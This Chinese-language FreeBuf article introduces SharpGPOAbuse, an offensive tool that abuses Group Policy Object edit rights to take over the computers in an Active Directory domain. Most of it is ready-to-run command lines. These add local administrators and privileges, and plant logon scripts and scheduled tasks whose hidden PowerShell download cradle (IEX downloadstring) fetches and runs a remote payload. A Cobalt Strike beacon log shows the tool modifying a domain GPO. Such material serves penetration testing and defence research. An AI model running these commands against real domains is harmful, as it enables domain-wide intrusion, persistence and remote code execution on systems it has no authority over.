**HW期间，为防范钓鱼，即日起FreeBuf将取消投稿文章的一切外部链接。给您带来的不便，敬请谅解~**

![](https://image.3001.net/images/20210405/1617610930_606ac8b2d58ed58c97453.jpg!small)

## 关于SharpGPOAbuse

SharpGPOAbuse是一个功能强大的.NET应用程序，SharpGPOAbuse基于C#开发，可以帮助广大研究人员利用目标系统中用户针对一个组策略对象（GPO）的编辑权限来入侵并控制由该组策略对象（GPO）控制的对象。

## 项目获取

广大研究人员可以使用下列命令将该项目源码克隆至本地：

    
    
    git clone https://github.com/FSecureLABS/SharpGPOAbuse.git

## 代码编译

请确保本地主机中必要的NuGet包已正常安装，然后就可以使用Visual Studio将项目导入之后直接编译构建了。

## 工具使用

    
    
    Usage:
    
            SharpGPOAbuse.exe <攻击类型> <攻击选项>

## 攻击类型

当前版本的SharpGPOAbuse支持下列攻击类型：

 ** **选项****

|

 ** **描述****  
  
---|---  
  
\--AddUserRights

|

向用户添加权限  
  
\--AddLocalAdmin

|

向本地管理员组中添加一个用户  
  
\--AddComputerScript

|

添加一个新的计算机启动脚本  
  
\--AddUserScript

|

配置一个用户登录脚本  
  
\--AddComputerTask

|

配置一个计算机立即执行的任务  
  
\--AddUserTask

|

向用户添加一个立即执行的任务  
  
## 攻击选项

### 添加用户权限

    
    
    Options required to add new user rights:
    
    --UserRights
    
            给用户添加新的权限，该参数大小写敏感，可以使用逗号分隔的列表。
    
    --UserAccount
    
            设置需要添加新权限的用户账号。
    
    --GPOName
    
            存在安全漏洞的GPO名称。
    
            
    
    样例:
    
            SharpGPOAbuse.exe --AddUserRights --UserRights "SeTakeOwnershipPrivilege,SeRemoteInteractiveLogonRight" --UserAccount bob.smith --GPOName "Vulnerable GPO"

### 添加一个本地管理员

    
    
    Options required to add a new local admin:
    
    --UserAccount
    
            设置需要添加进本地管理员组中的账号名称。
    
    --GPOName
    
            存在安全漏洞的GPO名称。
    
     
    
    样例:
    
            SharpGPOAbuse.exe --AddLocalAdmin --UserAccount bob.smith --GPOName "Vulnerable GPO"

### 配置一个用户或计算机登录脚本

    
    
    Options required to add a new user or computer startup script:
    
    --ScriptName
    
            设置新启动脚本的名称。
    
    --ScriptContents
    
            设置新启动脚本的内容。
    
    --GPOName
    
            存在安全漏洞的GPO名称。
    
     
    
    样例:
    
            SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"

如果你只想要对GPO控制的特定用户或计算机执行恶意脚本，你可以在恶意脚本中添加一个if语句：

    
    
    SharpGPOAbuse.exe --AddUserScript --ScriptName StartupScript.bat --ScriptContents "if %username%==<targetusername> powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"

### 配置计算机或用户立即执行的任务

    
    
    Options required to add a new computer or user immediate task:
    
     
    
    --TaskName
    
            设置新计算机任务的名称。Set the name of the new computer task.
    
    --Author
    
            设置新任务的开发者（可以使用DA账号）。
    
    --Command
    
            需要执行的命令
    
    --Arguments
    
            传递给命令的参数。
    
    --GPOName
    
            存在安全漏洞的GPO名称。
    
     
    
    Additional User Task Options:
    
    --FilterEnabled
    
            启用任务过滤器。Enable Target Filtering for user immediate tasks.
    
    --TargetUsername
    
            目标用户，恶意任务只会针对特定用户运行，格式为 <DOMAIN>\<USERNAME>。
    
    --TargetUserSID
    
            目标用户的SID。
    
     
    
    Additional Computer Task Options:
    
    --FilterEnabled
    
            启用任务过滤器。
    
    --TargetDnsName
    
            目标DNS名称，恶意任务只会针对目标主机运行。
    
            
    
    样例:
    
            SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO"

如果你只想要对GPO控制的特定用户或计算机运行恶意任务，你可以参照下列命令：

    
    
    SharpGPOAbuse.exe --AddComputerTask --TaskName "Update" --Author DOMAIN\Admin --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.10:80/a'))\"" --GPOName "Vulnerable GPO" --FilterEnabled --TargetDnsName target.domain.com

### 额外选项

 ** **选项****

|

 ** **描述****  
  
---|---  
  
\--DomainController

|

设置目标域控制器  
  
\--Domain

|

设置目标域名  
  
\--Force

|

改写现有文件  
  
## 工具输出样例

    
    
    beacon> execute-assembly /root/Desktop/SharpGPOAbuse.exe --AddComputerTask --TaskName "New Task" --Author EUROPA\Administrator --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://10.1.1.141:80/a'))\"" --GPOName "Default Server Policy"
    
    [*] Tasked beacon to run .NET program: SharpGPOAbuse_final.exe --AddComputerTask --TaskName "New Task" --Author EUROPA\Administrator --Command "cmd.exe" --Arguments "/c powershell.exe -nop -w hidden -c \"I
    
    EX ((new-object net.webclient).downloadstring('http://10.1.1.141:80/a'))\"" --GPOName "Default Server Policy"
    
    [+] host called home, sent: 171553 bytes
    
    [+] received output:
    
    [+] Domain = europa.com
    
    [+] Domain Controller = EURODC01.europa.com
    
    [+] Distinguished Name = CN=Policies,CN=System,DC=europa,DC=com
    
    [+] GUID of "Default Server Policy" is: {877CB769-3543-40C6-A757-F2DF4E5E28BD}
    
    [+] Creating file \\europa.com\SysVol\europa.com\Policies\{877CB769-3543-40C6-A757-F2DF4E5E28BD}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
    
    [+] versionNumber attribute changed successfully
    
    [+] The version number in GPT.ini was increased successfully.
    
    [+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
    
    [+] Done!

## 项目地址

SharpGPOAbuse：https://github.com/FSecureLABS/SharpGPOAbuse

## 参考资料

> https://labs.mwrinfosecurity.com/tools/sharpgpoabuse﻿

